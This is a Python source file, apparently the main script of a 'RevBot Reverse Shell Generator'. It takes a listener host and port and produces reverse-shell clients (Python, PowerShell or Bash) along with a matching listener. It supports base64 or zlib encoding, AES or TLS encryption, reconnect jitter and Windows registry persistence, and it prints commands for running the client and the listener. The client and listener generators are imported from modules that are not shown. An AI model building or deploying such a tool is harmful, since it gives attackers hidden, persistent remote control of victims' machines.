import argparse
import os
import base64
import logging
from .client_generator import generate_client
from .listener_generator import generate_listener
from .utilities import generate_tls_certificates, setup_logging, get_random_aes_key

# Constants
OUTPUT_DIR = "revbot_output"
MAGIC_DELIMITER = "REVBOT_DELIM"

def main():
    parser = argparse.ArgumentParser(description="RevBot Reverse Shell Generator")
    parser.add_argument("--lhost", required=True, help="Listener host IP")
    parser.add_argument("--lport", type=int, required=True, help="Listener port")
    parser.add_argument("--shell-type", choices=["python_tcp", "powershell_tcp", "bash_tcp"], default="python_tcp", help="Shell type")
    parser.add_argument("--encoding", choices=["none", "base64", "zlib_base64"], default="base64", help="Encoding scheme")
    parser.add_argument("--encryption", choices=["none", "aes", "tls"], default="none", help="Encryption type")
    parser.add_argument("--aes-key", help="AES key (base64-encoded, 32 bytes)")
    parser.add_argument("--persistence", choices=["none", "windows_registry"], default="none", help="Persistence method")
    parser.add_argument("--platform", choices=["Windows", "Linux", "Darwin"], default="Windows", help="Target platform")
    parser.add_argument("--output-dir", default=OUTPUT_DIR, help="Output directory")
    parser.add_argument("--jitter-min", type=int, default=5, help="Min reconnect jitter (seconds)")
    parser.add_argument("--jitter-max", type=int, default=15, help="Max reconnect jitter (seconds)")
    parser.add_argument("--generate-tls", action="store_true", help="Generate TLS certificates")
    args = parser.parse_args()

    # Setup logging
    logger = setup_logging(args.output_dir)

    # Validate or generate AES key
    if args.aes_key:
        try:
            aes_key = base64.b64decode(args.aes_key)
            if len(aes_key) != 32:
                raise ValueError("AES key must be 32 bytes")
        except Exception as e:
            logger.error(f"Invalid AES key: {e}")
            print(f"[!] Error: Invalid AES key: {e}")
            return
    else:
        aes_key = get_random_aes_key() if args.encryption == "aes" else b""

    aes_iv = get_random_aes_key(16) if args.encryption == "aes" else b""

    # Configuration
    config = {
        "lhost": args.lhost,
        "port": args.lport,
        "shell_type": args.shell_type,
        "encoding_scheme": args.encoding,
        "encryption_enabled": args.encryption in ["aes", "tls"],
        "encryption_type": args.encryption,
        "platform": args.platform,
        "persistence_type": args.persistence,
        "delimiter": MAGIC_DELIMITER,
        "output_file": os.path.join(args.output_dir, f"client_{args.shell_type}.{'ps1' if args.shell_type == 'powershell_tcp' else 'sh' if args.shell_type == 'bash_tcp' else 'py'}"),
        "listener_file": os.path.join(args.output_dir, "revbot_listener.py"),
        "reconnect_jitter_min": args.jitter_min,
        "reconnect_jitter_max": args.jitter_max,
        "aes_key": aes_key,
        "aes_key_hex": aes_key.hex(),
        "aes_iv": aes_iv,
        "aes_iv_hex": aes_iv.hex(),
        "output_dir": args.output_dir
    }

    # Generate TLS certificates if needed
    if args.generate_tls or config["encryption_type"] == "tls":
        generate_tls_certificates(config["output_dir"])

    # Generate scripts
    try:
        generate_client(config)
        generate_listener(config)
        print(f"[*] Scripts generated in {config['output_dir']}")
        print(f"[*] To run listener: python3 {config['listener_file']}")
        print(f"[*] To run client: {'python3' if config['shell_type'] == 'python_tcp' else 'powershell -File' if config['shell_type'] == 'powershell_tcp' else './'} {config['output_file']}")
        if config["shell_type"] in ["powershell_tcp", "bash_tcp"]:
            print("[*] Warning: PowerShell/Bash clients have limited features (basic file transfer, no screenshots). Use Python for full functionality.")
        if config["shell_type"] == "bash_tcp" and config["encryption_type"] == "aes":
            print("[*] Warning: AES encryption not supported in Bash. Using base64 encoding.")
    except Exception as e:
        logger.error(f"Generation error: {e}")
        print(f"[!] Error generating scripts: {e}")

if __name__ == "__main__":
    main()
